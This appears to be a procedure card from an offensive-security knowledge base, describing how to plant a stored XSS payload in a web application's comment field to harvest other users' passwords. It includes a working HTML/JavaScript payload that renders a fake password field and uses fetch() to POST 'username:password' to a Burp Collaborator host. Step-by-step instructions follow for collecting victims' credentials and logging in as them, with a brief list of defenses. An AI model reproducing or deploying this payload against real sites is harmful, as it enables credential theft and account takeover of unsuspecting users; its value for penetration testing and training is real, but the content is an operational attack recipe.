---
id: 4859e3fe-9930-4779-b9e0-63f554ea261b
name: Stored-XSS-to-Capture-Passwords-Using-Burp-Collaborator
type: procedure
verified: true
submitted: true
created_at: '2020-08-05T18:13:46.432602+00:00'
updated_at: '2023-05-26T01:30:22.636048+00:00'
platforms:
  - Web
tags:
  - '[[tags/Burp]]'
  - '[[tags/injection]]'
  - '[[tags/owasp]]'
  - '[[tags/owasp top 10]]'
  - '[[tags/Stored XSS]]'
  - '[[tags/Web Applications]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
commands: []
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Stored-XSS-to-Capture-Passwords-Using-Burp-Collaborator

## Summary

This procedure exploits a stored XSS vulnerability in a web application, such as a blog comment section, to inject a malicious payload that captures usernames and passwords from other users when they interact with the vulnerable input field. The exfiltrated credentials are sent to a Burp Collaborator server for collection, allowing the attacker to harvest sensitive data from multiple victims and potentially gain unauthorized access to their accounts.

## Description

Stored XSS involves injecting malicious scripts into persistent data storage, like database comments, which are then rendered and executed in users' browsers. In this scenario, the attacker targets a web application with insufficient input sanitization in a comment or form field. By using Burp Collaborator, a unique subdomain is generated to receive outbound requests from victims' browsers. When a victim enters their credentials into a form (e.g., a login prompt triggered by the payload), the JavaScript in the payload uses the Fetch API to send the data via a POST request to the Collaborator endpoint. This technique is effective against applications vulnerable to OWASP Top 10 A7: Cross-Site Scripting, specifically stored variants, and can lead to widespread credential theft if the injected content is publicly viewable.

## Requirements

1. Burp Suite Professional edition with Burp Collaborator client access.
2. A vulnerable web application with a stored XSS entry point, such as a comment section that renders user input without sanitization.
3. Attacker-controlled network or proxy setup to monitor Collaborator interactions.
4. Basic knowledge of web application structure and JavaScript execution in browsers.

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML entity encoding) for all user inputs.
- Deploy Content Security Policy (CSP) headers to restrict script execution and outbound requests.
- Monitor for anomalous outbound DNS or HTTP requests to unknown domains like Burp Collaborator subdomains.
- Use Web Application Firewalls (WAFs) to detect and block XSS payloads in stored content.
- Enable browser security features like XSS Auditor and educate users on phishing risks.

## Objectives

1. Inject a persistent XSS payload into the target application to execute on victim browsers.
2. Exfiltrate victim credentials to the attacker's Burp Collaborator server.
3. Use captured credentials to authenticate as other users, such as administrators.

## Instructions

### Step 1: Launch Burp Collaborator Client

**Context**: Generate a unique Collaborator payload (subdomain) to receive exfiltration requests from victims' browsers. This step sets up the data collection endpoint.

Open Burp Suite Professional and navigate to the Burp menu, then select "Burp Collaborator client" to launch the interface and copy the generated Collaborator URL.

### Step 2: Inject XSS Payload into Vulnerable Field

**Context**: Insert the malicious payload into a stored input field, such as a blog comment section, to ensure it persists and executes when viewed by other users.

Navigate to the vulnerable input field in the web application. Paste the following payload, replacing the Collaborator URL with your generated one:

**Code** ([[codes/XSS-Payload-to-Exfiltrate-Credentials-via-Fetch]]):

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://your-subdomain.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Submit the comment or form. Verify that the payload appears in the rendered page source without being sanitized.

### Step 3: Monitor for Victim Interactions

**Context**: Wait for other users to view the injected content and interact with the fake form, triggering credential submission to your Collaborator server.

In the Burp Collaborator client, monitor the interface for incoming HTTP requests. If no requests appear immediately, click "Poll now" to refresh and check for DNS/HTTP interactions.

### Step 4: Extract Captured Credentials

**Context**: Review the incoming requests to retrieve usernames and passwords sent by victims.

Examine the POST request bodies in the Collaborator details, which will contain formats like "username:password" from the payload's body parameter.

### Step 5: Authenticate with Captured Credentials

**Context**: Use the exfiltrated credentials to log in to the application as the victim, potentially escalating to higher privileges.

Return to the web application's login page and enter the captured username and password to gain access.
